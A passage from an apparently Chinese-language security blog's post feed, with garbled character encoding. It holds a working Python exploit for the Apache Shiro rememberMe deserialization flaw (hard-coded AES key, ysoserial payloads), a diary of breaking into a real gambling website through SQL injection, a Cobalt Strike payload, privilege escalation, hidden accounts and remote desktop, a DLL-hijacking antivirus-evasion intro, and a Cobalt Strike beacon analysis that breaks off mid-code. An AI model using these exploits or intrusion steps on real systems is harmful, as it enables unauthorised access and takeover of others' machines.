class="hljs-string">&#x27;CommonsCollections2&#x27;</span>, command], stdout=subprocess.PIPE)<br><br>    <span class="hljs-comment"># æ˜æ–‡éœ€è¦æŒ‰ä¸€å®šé•¿åº¦å¯¹é½ï¼Œå«åšå—å¤§å°BlockSize è¿™ä¸ªå—å¤§å°æ˜¯ block_size = 16 å­—èŠ‚</span><br>    BS = AES.block_size<br><br>    <span class="hljs-comment"># æŒ‰ç…§åŠ å¯†è§„åˆ™æŒ‰ä¸€å®šé•¿åº¦å¯¹é½,å¦‚æœä¸å¤Ÿè¦è¦åšå¡«å……å¯¹é½</span><br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br><br>    <span class="hljs-comment"># æ³„éœ²çš„key</span><br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br><br>    <span class="hljs-comment"># AESçš„CBCåŠ å¯†æ¨¡å¼</span><br>    mode = AES.MODE_CBC<br><br>    <span class="hljs-comment"># ä½¿ç”¨uuid4åŸºäºéšæœºæ•°æ¨¡å—ç”Ÿæˆ16å­—èŠ‚çš„ ivå‘é‡</span><br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br><br>    <span class="hljs-comment"># å®ä¾‹åŒ–ä¸€ä¸ªåŠ å¯†æ–¹å¼ä¸ºä¸Šè¿°çš„å¯¹è±¡</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br><br>    <span class="hljs-comment"># ç”¨padå‡½æ•°å»å¤„ç†ysoçš„å‘½ä»¤è¾“å‡ºï¼Œç”Ÿæˆçš„åºåˆ—åŒ–æ•°æ®</span><br>    file_body = pad(popen.stdout.read())<br><br>    <span class="hljs-comment"># iv ä¸ ï¼ˆåºåˆ—åŒ–çš„AESåŠ å¯†åçš„æ•°æ®ï¼‰æ‹¼æ¥ï¼Œ æœ€ç»ˆè¾“å‡ºç”ŸæˆrememberMeå‚æ•°</span><br>    base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))<br><br>    <span class="hljs-keyword">return</span> base64_rememberMe_value<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dnslog</span>(<span class="hljs-params">command</span>):</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial.jar&#x27;</span>, <span class="hljs-string">&#x27;URLDNS&#x27;</span>, command], stdout=subprocess.PIPE)<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_rememberMe_value<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># cc2çš„exp</span><br>    payload = encode_rememberme(<span class="hljs-string">&#x27;C:\\WINDOWS\\System32\\calc.exe&#x27;</span>)<br>    print(<span class="hljs-string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode()))<br><br>    <span class="hljs-comment"># dnslogçš„poc</span><br>    payload1 = encode_rememberme(<span class="hljs-string">&#x27;https://glacierrrr.online&#x27;</span>)<br>    print(<span class="hljs-string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload1.decode()))<br><br>    cookie = &#123;<br>        <span class="hljs-string">&quot;rememberMe&quot;</span>: payload.decode()<br>    &#125;<br><br>    requests.get(url=<span class="hljs-string">&quot;http://127.0.0.1:8080/web_war/&quot;</span>, cookies=cookie)<br></code></pre></td></tr></table></figure><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>è¿™é‡Œå¯ä»¥ç›´æ¥ç”¨vulhubæ›´å¿«çš„æ­å»º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /vulhub/shiro/CVE-2016-4437<br>docker-compose build <br>docker-compose up -d<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/04/CuxULEhsrSj5wIa.png"><br>æ­å»ºå¥½åï¼Œ8080ç«¯å£å°±å¯ä»¥çœ‹åˆ°shiroæ¡†æ¶çš„ç™»å½•ç•Œé¢äº†</p><h2 id="åˆ¤æ–­shiro"><a href="#åˆ¤æ–­shiro" class="headerlink" title="åˆ¤æ–­shiro"></a>åˆ¤æ–­shiro</h2><p>æˆ‘ä»¬å…ˆç”¨burp suiteæŠ“ä¸ªåŒ…çœ‹ä¸€ä¸‹<br><img src="https://s2.loli.net/2023/01/04/ANtBJlzRTguFnOp.png"><br>æ¥ç€æˆ‘ä»¬åœ¨æŠ¥æ–‡å¤´ä¸­åŠ å…¥<code>Cookie: rememberMe=123;</code><br><img src="https://s2.loli.net/2023/01/04/DgABhVidkIZUe8p.png"><br>å†è¿”å›çš„æŠ¥æ–‡ä¸­ï¼Œä¹Ÿå¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°<code>rememberMe=deleteMe</code><br>è¿™ä¸ªå°±æ˜¯åˆ¤æ–­shiroæ¡†æ¶çš„ä¿¡æ¯<br>æˆ–è€…ä½¿ç”¨bpçš„æ’ä»¶BurpShiroPassiveScan<br><img src="https://s2.loli.net/2023/01/04/yzoGSnuJLr2EWXc.png"><br>è¿™æ ·bpä¼šè‡ªåŠ¨æ£€æµ‹ï¼Œå¹¶ç›´æ¥çˆ†å‡ºshiroçš„æ¼æ´</p><h2 id="åˆ©ç”¨shiro"><a href="#åˆ©ç”¨shiro" class="headerlink" title="åˆ©ç”¨shiro"></a>åˆ©ç”¨shiro</h2><p>å¯ä»¥ä½¿ç”¨æˆ‘ä»¬ä¸Šé¢ç»™å‡ºçš„expï¼Œåˆ©ç”¨ysoserialç›´æ¥æ‰“</p><p>æˆ–è€…ç›´æ¥ä½¿ç”¨é›†æˆåŒ–è¾ƒé«˜çš„å·¥å…·ï¼Œæ‰«æå¹¶åˆ©ç”¨<br><img src="https://s2.loli.net/2023/01/04/EsX8jOvBxM3Qgad.png"></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¡†æ¶æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¸—é€æ—¥è®°1</title>
      <link href="2022/12/31/%E6%B8%97%E9%80%8F%E6%97%A5%E8%AE%B01/"/>
      <url>2022/12/31/%E6%B8%97%E9%80%8F%E6%97%A5%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<p>æ¸—é€å°è®¡ï¼šç¢°åˆ°ä¸€ä¸ªèµŒåšç½‘ç«™ï¼Œé€šè¿‡sqlæ³¨å…¥æˆåŠŸä¸Šçº¿ï¼Œè®°å½•ä¸€ä¸‹æ¸—é€è¿‡ç¨‹</p><a id="more"></a><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><blockquote><p>åˆ«å¿˜è®°æŒ‚ä»£ç†<br>å…ˆæŠŠç½‘å€æ”¾ä¸Šæ¥<code>aHR0cDovL3d3dy40MjAyMjIubmV0Lw==</code><br>æˆ‘ä»¬æŠŠè¿™ä¸ªurlæ‹¿åˆ°å¥‡å®‰ä¿¡å¨èƒç ”åˆ¤ä¸­å¿ƒå»çœ‹ä¸€ä¸‹<br><a href="https://ti.qianxin.com/v2/search?type=domain&value=www.420222.net">å¥‡å®‰ä¿¡å¨èƒæƒ…æŠ¥ä¸­å¿ƒ</a><br>æ‹¿åˆ°å…¶çœŸå®IP<br><img src="https://s2.loli.net/2022/12/31/b8drCavs5kyXoYi.png"><br>ç›´æ¥è®¿é—®è¿™ä¸ªipçœ‹ä¸€ä¸‹æ˜¯å•¥<br><img src="https://s2.loli.net/2022/12/31/gl3idPbAUkrfL74.png"><br>å‘ç°ç›´æ¥404äº†ï¼Œé‚£æˆ‘ä»¬æ‹¿å»ç”¨nmapç«¯å£æ‰«æä¸€ä¸‹ï¼Œä¹Ÿå¯ä»¥ç”¨fofaå»æŸ¥ä¸€ä¸‹</p></blockquote><p>è¿™é‡Œæˆ‘ç”¨fofaç›´æ¥æ‰«åˆ°ä¸€ä¸ªç«¯å£8099æ˜¯åå°ç™»é™†<br><img src="https://s2.loli.net/2022/12/31/mywZiORKlIuVE7J.png"></p><p>è®¿é—®è¿›å…¥å…¶åå°ç™»å½•ç•Œé¢<br><img src="https://s2.loli.net/2022/12/31/6oigYVWBOR8NC1w.png"></p><h1 id="å¼€å§‹æ¸—é€"><a href="#å¼€å§‹æ¸—é€" class="headerlink" title="å¼€å§‹æ¸—é€"></a>å¼€å§‹æ¸—é€</h1><p>æˆ‘ä»¬ç”¨bpå…ˆæŠ“ä¸ªåŒ…çœ‹ä¸€ä¸‹<br><img src="https://s2.loli.net/2022/12/31/JjBMXFwiWxDYSPv.png"><br>å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªæµé‡ååˆ†çš„å¹²å‡€ï¼Œæ²¡æœ‰å¤šä½™çš„dataï¼Œå¹¶ä¸”æ˜¯ç›´æ¥æ˜æ–‡ä¼ è¾“çš„POST<br>åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬ç¬¬ä¸€ä¸ªæƒ³åˆ°çš„è‚¯å®šå°±æ˜¯sqlæ³¨å…¥å°è¯•ä¸€ä¸‹</p><blockquote><p>è¿™é‡Œç”¨åˆ°ä¸€ä¸ªå°æŠ€å·§ï¼Œåœ¨éœ€è¦å°è¯•æ³¨å…¥çš„åœ°æ–¹åŠ ä¸Š<code>*</code>ï¼Œå¹¶åˆ å»éæ³¨å…¥ç‚¹çš„<code>*</code>ï¼Œä¼ ç»™sqlmapï¼Œèƒ½æ›´å¥½çš„æ³¨å…¥<br><img src="https://s2.loli.net/2022/12/31/5Pw4VcCogFXyBfa.png"></p></blockquote><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p>ç›´æ¥ä¸Šsqlmapçœ‹ä¸€ä¸‹ï¼Œæœ‰æ²¡æœ‰å¯ä»¥æ³¨å…¥çš„ç‚¹<br><img src="https://s2.loli.net/2022/12/31/w6aOMXFRnEsyGxS.png"></p><p>å¯ä»¥çœ‹åˆ°sqlmapçš„å›æ˜¾,è¿™é‡Œæ˜¯æœ‰æ³¨å…¥ç‚¹çš„<br><code>Title: Microsoft SQL Server/Sybase stacked queries (comment)</code><br><code>Payload: userName=&#39;;WAITFOR DELAY &#39;0:0:10&#39;--1&amp;password=1</code><br>ä¹Ÿå¯ä»¥çœ‹åˆ°æ•°æ®åº“çš„ç±»å‹ï¼Œæ˜¯mssqlï¼Œç”±æ­¤å¯ä»¥æƒ³åˆ°ï¼Œæˆ‘ä»¬éœ€è¦åˆ¤æ–­æ˜¯å¦ä¸ºdbaç”¨æˆ·ï¼ˆdbaç”¨æˆ·å°±æ˜¯sqlæ•°æ®åº“çš„ç®¡ç†å‘˜ï¼‰<br><code>--is-dba</code><br>å¾—åˆ°sqlmapçš„å›æ˜¾ï¼Œç¡®å®šäº†æ˜¯dbaç”¨æˆ·<br><img src="https://s2.loli.net/2022/12/31/AE5fzRG1SjJ9us2.png"></p><p>ç”±äºæ˜¯mssqlï¼Œä¸mysqlä¸ä¸€æ ·ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨<code>--os-shell</code>è¿æ¥ï¼Œä¸éœ€è¦ä¸Šä¼ æ–‡ä»¶æ‰¾è·¯å¾„ç­‰ä¸€äº›éº»çƒ¦æ“ä½œ</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/307345176">â€“os-shellåŸç†</a><br>æˆåŠŸè¿ä¸Šshellä¹‹åï¼Œç”¨csç”Ÿæˆä¸€ä¸ªpowershell commandçš„payloadï¼Œç›´æ¥æ‰§è¡Œ</p></blockquote><p>æˆåŠŸä¸Šçº¿ï¼<br><img src="https://s2.loli.net/2022/12/31/PrdYXkZBQzvfuht.png"><br>é€šè¿‡æˆ‘ä»¬åœ¨fofaæŸ¥åˆ°çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-075">ms16-075</a>æ¥æ‰“</p><p>æˆåŠŸææƒï¼<br><img src="https://s2.loli.net/2022/12/31/PrdYXkZBQzvfuht.png"><br>æ¥ä¸‹æ¥å°±æ˜¯åˆ›å»ºéšè—ç”¨æˆ·ç­‰ç­‰æ“ä½œï¼Œè¿™é‡Œç›´æ¥ç”¨csçš„è„šæœ¬æ’ä»¶ï¼Œä¸€é”®ç›´æ¥åˆ›å»º</p><p>è¿™é‡Œå°±ä¸æ”¾å›¾äº†ï¼ŒææƒæˆåŠŸä¸€æŠŠæ¢­<br>æœ€åæˆåŠŸè¿æ¥è¿œç¨‹3389æ¡Œé¢ï¼</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æ—¥è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dllåŠ«æŒ_ç™½åŠ é»‘</title>
      <link href="2022/12/18/dll%E5%8A%AB%E6%8C%81_%E7%99%BD%E5%8A%A0%E9%BB%91/"/>
      <url>2022/12/18/dll%E5%8A%AB%E6%8C%81_%E7%99%BD%E5%8A%A0%E9%BB%91/</url>
      
        <content type="html"><![CDATA[<p>DLLåŠ«æŒå¯ä»¥ç”¨ä½œæƒé™ç»´æŒï¼Œæƒé™æå‡ç­‰ä½œç”¨ï¼Œä¸‹é¢ä»‹ç»ä¸€ä¸‹åœ¨æœ‰æ€æ¯’è½¯ä»¶çš„æƒ…å†µä¸‹dllåŠ«æŒé€šè¿‡ç™½åŠ é»‘çš„æ–¹å¼è·å–æƒé™ï¼Œä¸Šçº¿ç›®æ ‡ã€‚<br>æ€è½¯åœ¨æ£€æµ‹ä¸€ä¸ªåº”ç”¨æ˜¯å¦ä¸ºç—…æ¯’çš„æ—¶å€™ï¼Œé¦–å…ˆä¼šé€šè¿‡é»‘ç™½åå•æ ¡éªŒ-ç—…æ¯’ç‰¹å¾åº“æŸ¥è¯¢-ä¸Šä¼ äº‘æŸ¥æ€ï¼Œåœ¨é»‘ç™½åå•æ ¡éªŒé˜¶æ®µï¼Œå¦‚æœæ˜¯ç™½åå•ä¸­çš„åº”ç”¨åˆ™å¯ä»¥æˆåŠŸè¿è¡Œï¼Œç™½åå•ä¹Ÿå°±æ˜¯æœ‰æ•°å­—ç­¾åçš„åº”ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹æœ‰æ•°å­—ç­¾ååº”ç”¨ä¸­çš„dllï¼Œå½“è¯¥åº”ç”¨å¯åŠ¨æ—¶ä¼šè°ƒç”¨è¯¥dllï¼Œä»è€Œä¸Šçº¿ç›®æ ‡</p><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> å…æ€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dllåŠ«æŒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrikeä¸Šçº¿è¿‡ç¨‹ä¸è“é˜Ÿååˆ¶</title>
      <link href="2022/11/28/Cobaltstrike%E4%B8%8A%E7%BA%BF%E8%BF%87%E7%A8%8B%E4%B8%8E%E8%93%9D%E9%98%9F%E5%8F%8D%E5%88%B6/"/>
      <url>2022/11/28/Cobaltstrike%E4%B8%8A%E7%BA%BF%E8%BF%87%E7%A8%8B%E4%B8%8E%E8%93%9D%E9%98%9F%E5%8F%8D%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Cobaltstrikeä¸Šçº¿è¿‡ç¨‹ä¸è“é˜Ÿååˆ¶"><a href="#Cobaltstrikeä¸Šçº¿è¿‡ç¨‹ä¸è“é˜Ÿååˆ¶" class="headerlink" title="Cobaltstrikeä¸Šçº¿è¿‡ç¨‹ä¸è“é˜Ÿååˆ¶"></a>Cobaltstrikeä¸Šçº¿è¿‡ç¨‹ä¸è“é˜Ÿååˆ¶</h1><p>CSçš„æµé‡é€šé“æœ‰å¾ˆå¤šï¼Œå¦‚httpã€httpsã€dnsã€TCPã€SMBç­‰ï¼Œä½†æˆ‘ä»¬è¿™é‡Œä¸»è¦ç ”ç©¶beaconé€šè¿‡httpé€šé“çš„CSä¸Šçº¿è¿‡ç¨‹</p><a id="more"></a><p>æ‰€ä»¥æˆ‘ä»¬åˆ›å»ºç›‘å¬å™¨çš„æ—¶å€™payloadé€‰æ‹©Beacon HTTP</p><h2 id="Cobaltstrikeä¸Šçº¿è¿‡ç¨‹"><a href="#Cobaltstrikeä¸Šçº¿è¿‡ç¨‹" class="headerlink" title="Cobaltstrikeä¸Šçº¿è¿‡ç¨‹"></a>Cobaltstrikeä¸Šçº¿è¿‡ç¨‹</h2><p>è¿™é‡Œç”¨äº†åˆ«äººçš„ä¸€å¼ å›¾ï¼Œèƒ½å¾ˆæ¸…æ™°çš„çœ‹æ¸…æ¥šæµé‡äº¤äº’çš„å¤§è‡´æµç¨‹<br><img src="https://s2.loli.net/2022/11/28/Zqp2hx3YzyTNbB7.png"><br>æˆ‘ä»¬å¯¹å…¶ä¸­çš„æ¯ä¸€æ­¥æ¥å…·ä½“åˆ†æ</p><ol><li>é€šè¿‡å„ç§æ–¹å¼å°†æ ·æœ¬(åˆ†é˜¶æ®µçš„)æˆ–è€…æ¶æ„ä»£ç å‘é€åˆ°å—å®³ç«¯<br>è¿™ä¸ªæ¯”è¾ƒå¥½ç†è§£ï¼Œå°±æ˜¯ç¬¬ä¸€æ­¥å°†æœ¨é©¬æ”¾åˆ°å—å®³è€…ä¸»æœºä¸Š</li><li>è¿è¡Œæ ·æœ¬æˆ–æ‰§è¡Œæ¶æ„ä»£ç <br>è¿™æ­¥ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œå—å®³è€…è¿è¡Œæˆ‘ä»¬æ‰€ç”Ÿæˆçš„æœ¨é©¬</li><li>è¯·æ±‚ç‰¹å®šç®—æ³•è·å–åˆ°URI<br>è¿™é‡Œå…¶å®å‡ºç°äº†ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œä»€ä¹ˆæ˜¯ç‰¹å®šç®—æ³•ï¼Œè¿™é‡Œå°±æƒ³åˆ°äº†å¾ˆå¤šå®‰å…¨å…¬å¸ï¼Œèƒ½ç”¨ä»–ä»¬çš„å¼•æ“æ¥æŸ¥è¯¢åˆ°ç›¸å…³CSï¼ŒMSFçš„ç‰¹å¾ç ï¼Œç‰¹å¾æµé‡ç›¸å…³ä¿¡æ¯ï¼Œæ¥è¿›è¡Œæ‹¦æˆªã€‚é‚£ä¹ˆè¿™é‡Œçš„ç‰¹å®šç®—æ³•ä¹Ÿæ˜¯å¦‚æ­¤<br><img src="https://s2.loli.net/2022/11/28/bAcrXi4qwWhjIPe.png"><br>ä¸»è¦æ˜¯è¿™é‡Œçš„<code>checksum8</code>æ–¹æ³•ï¼Œå…¶ä¸»è¦å®ç°äº†è½¬asciiå¯¹åº”åè¿›åˆ¶ï¼Œç„¶åæ±‚å’Œ256å–ä½™ï¼Œæœ€åä½™æ•°å’Œ92ï¼Œ93æ¥å¯¹æ¯”ï¼Œ92æ˜¯x86,93æ˜¯x64ï¼Œè€Œæ‰€è°“çš„ç‰¹å¾æµé‡ç›¸å…³ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯å¯¹åº”çš„uri:<code>YPbR</code>(è¿™é‡Œå¯¹åº”çš„uriæ¯æ¬¡éƒ½ä¸ä¸€æ ·ï¼Œä½†ä¸€èˆ¬éƒ½æ˜¯4ä¸ªå­—ç¬¦)<br><img src="https://s2.loli.net/2022/11/28/qGIkZORXv3rT1jC.png" alt="image.png"></li><li>æ ¡éªŒURIï¼Œè¿”å›å®Œæ•´çš„stager beacon<br>è¿™é‡Œå°±å¯¹åº”ç¬¬ä¸‰æ­¥ï¼Œå—å®³è€…è¯·æ±‚äº†<code>YPbR</code>çš„å¯¹åº”URIï¼Œç„¶åcså‘å…¶å‘é€å®Œæ•´çš„beacon</li><li>å®Œæ•´çš„stager beaconæ–‡ä»¶<br>æˆ‘ä»¬å°†å…¶å¯¼å‡ºå¯¹è±¡ï¼ŒHTTP<br><img src="https://s2.loli.net/2022/11/28/1v5bIJ84CcZX9iO.png"></li><li>è§£å¯†stage beaconæ–‡ä»¶è·å–åˆ°å…¬é’¥ä»¥åŠç›¸å…³serverçš„ä¿¡æ¯<br><img src="https://s2.loli.net/2022/11/28/GALoNKkdOWMHZCi.png"><br>å°†æˆ‘ä»¬å¯¼å‡ºçš„å¯¹è±¡<code>YPbR</code>,è¿›è¡Œè§£å¯†ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå†™å¥½çš„<a href="https://github.com/minhangxiaohui/CSthing">è„šæœ¬</a><br>å°†å…¶è§£å¯†ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœ<br><img src="https://s2.loli.net/2022/11/28/suVM6E17mUWjpkL.png"><br>åœ¨å…¶ä¸­å¯ä»¥çœ‹åˆ°å¾ˆå¤šå…³é”®ä¿¡æ¯ï¼Œä¹Ÿæ˜¯å¾ˆå¤šå®‰å…¨å¤§å‚æ‰«æå™¨æ‰«æä¹‹åï¼Œèƒ½å¾—åˆ°çš„å†…å®¹</li></ol><ul><li>åœ¨<code>0x0001 payload type</code> è®°å½•äº†æ”»å‡»è½½è·ç±»å‹<code>windows-beacon_http-reverse_http</code></li><li>åœ¨<code>0x0002 port</code>è®°å½•äº†ç«¯å£<code>80</code></li><li>åœ¨<code>0x0003 sleeptime</code>è®°å½•äº†å¿ƒè·³é—´éš”<code>60000</code></li><li>åœ¨<code>0x0004 maxgetsize</code>è®°å½•äº†æœ€å¤§æ•°æ®é•¿åº¦<code>1048579</code></li><li>åœ¨<code>0x0005 jitter</code>è®°å½•äº†å¸§çš„åå·®<code>0</code></li><li>åœ¨<code>0x0007 publickey</code>è®°å½•äº†å…¬é’¥<code>30819f300d06092a864886f70d010101050003818d0030818902818100a738cde75f1fbb1c18646c377e03016b162b12ba72bdf7dc36b4cd2e4e9bae12205a95c26170bf908105ad7fa4bbccfa798632261bed9870f975f20794e1fe499523d71f08a56cae0315bfde3d6c8a16386b03b7a6551aa1336d50325a3500db27d78ad8fd13b6a73b9fb7c3fb4d7a088e323f07618656ecd83595fa5f823613020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</code></li><li>åœ¨<code>0x0008 server,get-uri</code>è®°å½•äº†è·å–çš„uri<code>192.168.152.129,/g.pixel</code></li><li>åœ¨<code>0x0009 useragent</code>è®°å½•äº†useragent<code>&#39;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; MATMJS)</code></li><li>åœ¨<code>0x000a post-uri</code>è®°å½•äº†æ‰§è¡Œå‘½ä»¤çš„uri<code>/submit.php</code></li><li>åœ¨<code>0x000b Malleable_C2_Instructions</code>è®°å½•äº†æ‰€æ‰§è¡Œçš„å‘½ä»¤<code>\x00\x00\x00\x04</code></li></ul><ol start="7"><li><p>ä½¿ç”¨å…¬é’¥åŠ å¯†ç›¸å…³å—å®³ç«¯çš„ä¿¡æ¯å’Œè‡ªå·±ä¼ªéšæœºç”Ÿæˆçš„ä¸€ä¸ªå¯¹ç§°åŠ å¯†çš„å¯†é’¥ç”ŸæˆCookieså­—æ®µï¼Œé€šè¿‡HTTPè¯·æ±‚æ”¾åœ¨å¿ƒè·³åŒ…é‡Œé¢ä¼ è¾“<br><img src="https://s2.loli.net/2022/11/28/dR6bJjk7M8UNVGt.png"><br>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨å¿ƒè·³è¿æ¥ä¸­ï¼Œcookieæ‰¿è½½çš„å°±æ˜¯å¯¹åº”çš„åŠ å¯†å†…å®¹ï¼Œè€Œè¿™é‡Œç”¨åˆ°çš„æ˜¯éå¯¹ç§°åŠ å¯†ï¼Œè€Œå»è·å–å¯¹åº”çš„ç§é’¥ï¼Œåˆ™éœ€è¦å»CSclientçš„æºç é‡Œé¢æ‰¾ï¼Œå…¶å…³é”®ä»£ç å¦‚ä¸‹<br><img src="https://s2.loli.net/2022/11/28/eXmzcC9lLoqJ827.png"><br>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ°CSserverçš„æœåŠ¡å™¨çœ‹ä¸€ä¸‹ï¼Œæ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶ååºåˆ—åŒ–å¾—åˆ°å¯¹åº”çš„å…¬ç§é’¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ga0wei.text;  <br>â€‹  <br><span class="hljs-keyword">import</span> sleep.runtime.Scalar;  <br>â€‹  <br><span class="hljs-keyword">import</span> javax.crypto.Cipher;  <br><span class="hljs-keyword">import</span> java.io.File;  <br><span class="hljs-keyword">import</span> java.io.FileInputStream;  <br><span class="hljs-keyword">import</span> java.io.FileOutputStream;  <br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;  <br><span class="hljs-keyword">import</span> java.security.KeyPair;  <br><span class="hljs-keyword">import</span> java.security.PrivateKey;  <br><span class="hljs-keyword">import</span> java.security.PublicKey;  <br><span class="hljs-keyword">import</span> java.util.Base64;  <br>â€‹  <br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Getkey</span> </span>&#123;  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String\[\] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;  <br>        PrivateKey privateKey;  <br>        Cipher cipher;  <br>        <span class="hljs-comment">//è·å–å¯†é’¥å¯¹è±¡   </span><br>        ObjectInputStream var2 \= <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;keys&quot;</span>));  <br>        Scalar var3 \= (Scalar)var2.readObject();  <br>        var2.close();  <br>        KeyPair keyPair1 \= (KeyPair) var3.objectValue();  <br>          <br>        <span class="hljs-comment">//åˆå§‹åŒ–cipherå¯¹è±¡ï¼Œå‡†å¤‡è§£å¯†  </span><br>        privateKey \=keyPair1.getPrivate();  <br>        cipher \=Cipher.getInstance(<span class="hljs-string">&quot;RSA/ECB/PKCS1Padding&quot;</span>);  <br>        cipher.init(<span class="hljs-number">2</span>,privateKey);  <br>          <br>        <span class="hljs-comment">//å…ƒæ•°æ®  </span><br>        String ciphertext \= <span class="hljs-string">&quot;WTbGz2y0K24UJovEX+proVDR+jInn7C/H8JwIa3+DCdm+qkSbquSRU2/n/ss8dMUHogaPFIn/N+xaAOW/gmfvu4HfVNF8Kk/XsRN35By03QWKIbhVbNGyZOBwCYGWs3f9XjUa8rqbiHbmRnRppbEpVv/+pvlVqYUh53bFQP9O7E=&quot;</span>;  <br>        <span class="hljs-keyword">byte</span>\[\] cipherbyte \= Base64.getDecoder().decode(ciphertext);  <br>          <br>        <span class="hljs-comment">//è§£å¯†  </span><br>        <span class="hljs-keyword">byte</span>\[\] text \= cipher.doFinal(cipherbyte);  <br>â€‹  <br>        <span class="hljs-comment">//è¾“å‡ºæ–‡ä»¶ å’Œæ§åˆ¶å°  </span><br>        <span class="hljs-keyword">try</span>(FileOutputStream fos \= <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;Text&quot;</span>))) &#123;  